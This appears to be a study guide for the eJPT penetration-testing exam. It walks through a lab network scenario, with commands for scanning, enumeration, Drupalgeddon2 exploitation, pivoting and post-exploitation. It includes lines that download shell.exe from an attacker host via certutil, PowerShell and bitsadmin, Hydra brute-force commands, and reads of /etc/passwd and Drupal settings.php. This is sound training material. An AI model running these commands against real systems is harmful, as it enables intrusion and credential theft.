# eJPT
Prerequisites which should be known and format of the questions
# SYNTEX DYNAMICS Network Analysis - eJPT Exam Methodology

## Introduction

This document provides a detailed analysis of the SYNTEX DYNAMICS network environment as part of an eJPT exam scenario. Rather than focusing on specific answers, I'll provide a comprehensive methodology and detailed explanation of the tools and techniques needed to successfully tackle this penetration testing scenario.

## Network Topology Overview

Based on the scan results, the network appears to consist of:

1. **DMZ Network** (192.168.100.0/24):
   - WINSERVER-01 (192.168.100.50)
   - WINSERVER-02 (192.168.100.51)
   - WINSERVER-03 (192.168.100.55)
   - Other hosts (192.168.100.63, 192.168.100.67)

2. **Linux-based systems** including at least one machine hosting a Drupal site
3. **Windows-based systems** in the DMZ with different roles and services

## Penetration Testing Methodology and Tools

### 1. Reconnaissance and Information Gathering

#### Network Scanning with Nmap

Nmap is the primary tool for initial network discovery and service enumeration.

```bash
# Basic network discovery scan
nmap -sn 192.168.100.0/24

# Comprehensive service and version scan
nmap -sV -sC -O -p- 192.168.100.0/24

# Targeted aggressive scan
nmap -A -T4 -p- 192.168.100.50
```

**Key Nmap options used in this scenario:**
- `-sV`: Service version detection
- `-sC`: Default script scan
- `-O`: OS detection
- `-p-`: Scan all 65535 ports
- `-A`: Aggressive scan (combines -sV, -sC, -O, and traceroute)
- `-T4`: Timing template (higher is faster)

Nmap also includes specialized NSE (Nmap Scripting Engine) scripts for specific services:

```bash
# SMB enumeration scripts
nmap --script=smb-os-discovery,smb-enum-shares,smb-enum-users 192.168.100.50

# Web server vulnerability scanning
nmap --script=http-vuln* 192.168.100.51

# FTP anonymous access check
nmap --script=ftp-anon 192.168.100.51
```

#### Web Application Reconnaissance

For Drupal and WordPress sites, specific tools provide deeper enumeration:

**WPScan for WordPress:**
```bash
wpscan --url http://192.168.100.50 --enumerate p,t,u
```
Options:
- `--enumerate p`: Enumerate plugins
- `--enumerate t`: Enumerate themes
- `--enumerate u`: Enumerate users

**Droopescan for Drupal:**
```bash
droopescan scan drupal -u http://192.168.100.67
```

**Directory and File Discovery:**
```bash
# Using dirbuster/dirb
dirb http://192.168.100.51 /usr/share/wordlists/dirb/common.txt

# Using gobuster
gobuster dir -u http://192.168.100.51 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### 2. Vulnerability Assessment

#### SMB/SAMBA Enumeration

**SMBClient for basic access:**
```bash
smbclient -L //192.168.100.67 -N
```

**SMBMap for permissions mapping:**
```bash
smbmap -H 192.168.100.67
```

**Enum4linux for comprehensive enumeration:**
```bash
enum4linux -a 192.168.100.67
```

#### FTP Enumeration

**Anonymous FTP access:**
```bash
ftp 192.168.100.51
# Login with username: anonymous and blank password
```

Commands to use once connected:
```
ls -la  # List all files including hidden ones
get filename  # Download a file to your local machine
```

#### Database Service Enumeration

**MySQL/MariaDB:**
```bash
# Connect to MySQL/MariaDB server
mysql -h 192.168.100.50 -P 3307 -u root -p

# If version fingerprinting is needed without login
nmap -sV --script=mysql-info -p 3307 192.168.100.50
```

#### Web Application Vulnerability Assessment

**Nikto for general web vulnerabilities:**
```bash
nikto -h http://192.168.100.51
```

**OWASP ZAP or Burp Suite** for interactive web application testing:
- Proxy web traffic
- Spider websites
- Identify potential injection points
- Test for XSS, SQLi, etc.

**Specific CMS vulnerability scanners:**
```bash
# Check for Drupalgeddon2 vulnerability
nmap --script http-vuln-cve2018-7600 -p 80 192.168.100.67
```

### 3. Exploitation Techniques

#### Web Application Exploitation

**Command Injection via WebShells:**
When a file like `cmdasp.aspx` is discovered on WINSERVER-02, it can be accessed through a browser to potentially execute commands:
```
http://192.168.100.51/cmdasp.aspx
```

**Drupalgeddon2 Exploitation with Metasploit:**
```bash
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.100.67
set TARGETURI /
exploit
```

**WordPress Exploitation:**
```bash
# Using Metasploit for vulnerable plugins
use exploit/unix/webapp/wp_plugin_vulnerability
```

#### Password Attacks

**Hydra for brute-forcing services:**
```bash
# RDP brute force
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt 192.168.100.55 rdp

# SSH brute force
hydra -l mary -P /usr/share/wordlists/rockyou.txt 192.168.100.67 ssh
```

**Password cracking with Hashcat:**
```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

### 4. Post-Exploitation

#### Windows Systems

**PowerShell for information gathering:**
```powershell
# System information
systeminfo

# Network connections
netstat -ano

# User accounts
net user
net localgroup administrators

# Scheduled tasks
schtasks /query /fo LIST /v
```

**Access token manipulation:**
```cmd
runas /user:Administrator cmd.exe
```

**File access and search:**
```cmd
dir C:\Users\Administrator\Desktop /s /b
type C:\Users\Administrator\flag.txt
```

#### Linux Systems

**Linux enumeration:**
```bash
# System information
uname -a
cat /etc/issue

# User information
cat /etc/passwd
sudo -l

# Finding specific files
find / -name flag.txt 2>/dev/null
```

**Drupal configuration access:**
```bash
# Accessing Drupal configuration
cat /var/www/html/sites/default/settings.php
```

### 5. Pivoting and Lateral Movement

#### Network Routing with Metasploit

After gaining a meterpreter shell, pivoting allows access to otherwise unreachable networks:

```
# Add a route through the compromised host
run autoroute -s 192.168.101.0/24

# Verify routes
run autoroute -p

# Start a SOCKS proxy for pivoting
use auxiliary/server/socks_proxy
run
```

#### Port Forwarding

**SSH port forwarding:**
```bash
# Local port forwarding
ssh -L 8080:192.168.101.5:80 user@192.168.100.67
```

**Chisel for advanced port forwarding:**
```bash
# Server (attack machine)
./chisel server -p 8000 --reverse

# Client (compromised host)
./chisel client 192.168.100.5:8000 R:3306:127.0.0.1:3306
```

#### Windows File Transfer Techniques

```powershell
# PowerShell file download
Invoke-WebRequest -Uri "http://192.168.100.5/shell.exe" -OutFile "C:\Windows\Temp\shell.exe"

# CertUtil (mentioned in question #34)
certutil.exe -urlcache -split -f "http://192.168.100.5/shell.exe" shell.exe

# BITS transfer
bitsadmin /transfer myJob /download /priority high http://192.168.100.5/shell.exe C:\Windows\Temp\shell.exe
```

### 6. Specialized Tools for Specific Tasks

#### For Scanning Internal Networks (After Pivoting)

```bash
# Using proxychains with nmap
proxychains nmap -sT -Pn 192.168.101.0/24
```

#### For Privilege Escalation

**Windows Privilege Escalation:**
```bash
# Upload and run automated enumeration
winPEAS.exe

# Check for exploitable services
accesschk.exe -uwcqv "Authenticated Users" *
```

**Linux Privilege Escalation:**
```bash
# Upload and run automated enumeration
./LinPEAS.sh

# Check for SUID binaries
find / -perm -u=s -type f 2>/dev/null
```

## Advanced Techniques Relevant to This Scenario

### Service-Specific Enumeration

#### For Drupal Sites:
- Identifying version: Check `/CHANGELOG.txt` or `/README.txt`
- Enumerating users: Access `/user/login` and attempt username enumeration
- Finding modules: Check `/modules/` directory

#### For Windows Server Analysis:
- Windows Event Log analysis using PowerShell:
  ```powershell
  Get-EventLog -LogName Security -Newest 20
  ```
- Group Policy enumeration:
  ```cmd
  gpresult /r
  ```

### Web Application Endpoint Exploitation

Targeting specific endpoints for the discovered applications:

1. **Drupal Admin Login:**
   ```
   http://192.168.100.67/user/login
   ```

2. **WordPress Admin:**
   ```
   http://192.168.100.50/wp-admin/
   ```

3. **IIS Control Panel:**
   ```
   http://192.168.100.51/iisstart.htm
   ```

### Database Enumeration

When accessing MySQL/MariaDB database:

```sql
-- List all databases
SHOW DATABASES;

-- Select specific database (e.g., Drupal's database)
USE drupal;

-- List tables
SHOW TABLES;

-- Get Drupal users
SELECT * FROM users;
```

## Methodology Summary for eJPT Exam Success

1. **Information Gathering Phase**
   - Network scanning with Nmap
   - Service identification and version detection
   - Operating system fingerprinting
   - Web application discovery

2. **Enumeration Phase**
   - Service-specific enumeration (FTP, SMB, HTTP, etc.)
   - Content discovery on web servers
   - User enumeration where possible
   - Vulnerability identification

3. **Exploitation Phase**
   - Target vulnerable services (Drupal, WordPress, etc.)
   - Credential-based attacks
   - Web application exploitation
   - Command injection

4. **Post-Exploitation Phase**
   - Privilege escalation
   - Data collection
   - Flag retrieval
   - Network exploration

5. **Pivoting Phase**
   - Adding routes to internal networks
   - Scanning previously inaccessible segments
   - Exploiting additional hosts

## Key Tools Summary

1. **Reconnaissance Tools**
   - Nmap: Network discovery and service enumeration
   - Dig/host/whois: Domain information gathering

2. **Web Application Tools**
   - WPScan: WordPress enumeration and vulnerability scanning
   - Droopescan: Drupal enumeration
   - Gobuster/Dirb: Directory and file discovery
   - Burp Suite/OWASP ZAP: Web application proxy and testing

3. **Exploitation Tools**
   - Metasploit Framework: Exploitation and post-exploitation
   - SearchSploit: Offline exploit database
   - Hydra: Password brute-forcing

4. **Post-Exploitation Tools**
   - Mimikatz: Windows credential harvesting
   - PowerSploit: PowerShell post-exploitation framework
   - linPEAS/winPEAS: Automated privilege escalation scanners

5. **Pivoting Tools**
   - Proxychains: SOCKS proxy for pivoting
   - Chisel: TCP tunnel and port forwarding
   - SSH port forwarding

## Conclusion

The SYNTEX DYNAMICS eJPT exam scenario tests fundamental penetration testing skills within a corporate network environment. By systematically applying the methodology outlined above and leveraging the appropriate tools, candidates can effectively enumerate the network, identify vulnerabilities, exploit weak points, and ultimately answer all the exam questions.

The key to success in this type of assessment is thorough documentation of findings, methodical exploration of the network, and attention to detail when examining services and potential vulnerabilities. By mastering these core penetration testing skills and tools, you'll be well-prepared not only for the eJPT certification but for real-world security assessments as well.
